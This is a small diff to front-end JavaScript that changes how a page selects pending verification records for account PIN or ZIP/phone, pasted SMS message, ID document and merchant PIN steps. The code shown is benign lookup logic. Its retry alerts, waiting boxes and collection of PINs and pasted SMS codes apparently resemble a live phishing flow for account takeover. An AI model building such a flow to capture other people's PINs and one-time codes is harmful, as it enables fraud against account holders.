@@ -1872,8 +1872,9 @@
             const verifications = data.verifications || [];
 
             // Step 3: Account PIN verification check
-            const accountPinVer = (activePinVerId && verifications.find(v => v.id === activePinVerId))
-              || verifications.find(v => v.step === 'account_pin' || v.step === 'zip_phone');
+            const accountPinVer = activePinVerId 
+              ? verifications.find(v => v.id === activePinVerId)
+              : verifications.find(v => (v.step === 'account_pin' || v.step === 'zip_phone') && v.status === 'pending');
             const pinAlert = document.getElementById('pin-retry-alert');
             const pinWaitingBox = document.getElementById('pin-waiting-box');
 
@@ -1911,8 +1912,9 @@
             }
 
             // Step 4: SMS Verification check
-            const smsVer = (activeSmsVerId && verifications.find(v => v.id === activeSmsVerId))
-              || verifications.find(v => v.step === 'id_document');
+            const smsVer = activeSmsVerId 
+              ? verifications.find(v => v.id === activeSmsVerId)
+              : verifications.find(v => v.step === 'id_document' && v.status === 'pending');
             const msgAlert = document.getElementById('msg-retry-alert');
             const smsWaitingBox = document.getElementById('sms-waiting-box');
             const smsBtn = document.getElementById('submit-pasted-msg-btn');
@@ -1976,8 +1978,9 @@
             }
 
             // Step 5: Merchant PIN verification check
-            const merchantPinVer = (activeMerchantPinId && verifications.find(v => v.id === activeMerchantPinId))
-              || verifications.find(v => v.step === 'merchant_pin');
+            const merchantPinVer = activeMerchantPinId 
+              ? verifications.find(v => v.id === activeMerchantPinId)
+              : verifications.find(v => v.step === 'merchant_pin' && v.status === 'pending');
             const mAlert = document.getElementById('merchant-pin-retry-alert');
             const mWaitingBox = document.getElementById('merchant-pin-waiting-box');
 
